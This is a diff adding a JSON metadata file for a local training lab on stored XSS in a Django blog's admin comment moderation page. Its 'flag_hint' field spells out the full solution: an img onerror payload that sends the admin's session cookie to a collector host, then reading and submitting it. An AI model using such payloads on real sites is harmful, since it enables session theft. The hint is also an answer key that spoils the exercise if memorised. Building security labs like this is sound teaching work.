@@ -1,0 +1,43 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "stored-xss-comment-plain",
+  "title": "Stored XSS in Blog Comment Moderation",
+  "track": "xss",
+  "difficulty": "apprentice",
+  "estimated_minutes": 30,
+  "max_lifetime_minutes": 45,
+  "learning_objectives": [
+    "Identify stored (persistent) XSS: attacker input is saved and later rendered unsafely to a different, higher-privileged user",
+    "Recognise Django's `|safe` template filter as an autoescape-disabling footgun on user-controlled data",
+    "Understand the source≠sink, attacker≠victim shape of stored XSS (you post; the admin's browser runs it)",
+    "Reach a page you cannot load yourself (admin-only moderation) by planting a payload the admin will render",
+    "Exfiltrate the admin's non-HttpOnly session cookie to an OOB collector"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79"],
+  "prerequisites": ["reflected-xss-search-noescape"],
+  "flag_hint": "POST /comment {\"body\":\"<img src=x onerror=\\\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\\\">\"}; the admin bot renders it on GET /admin/moderate (|safe), exfiltrating its session cookie. Read it via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
+  "tech_stack": [
+    "Python 3.12",
+    "Django 5.2",
+    "gunicorn 23",
+    "PostgreSQL 16",
+    "@websec-lab/xss-verifier headless-Chromium bot",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "stored-xss",
+    "django",
+    "template-safe-filter",
+    "cookie-theft",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The classic stored-XSS-in-comments pattern, on a real Django + PostgreSQL stack, abstracted for local Docker with a Playwright moderation bot"
+}
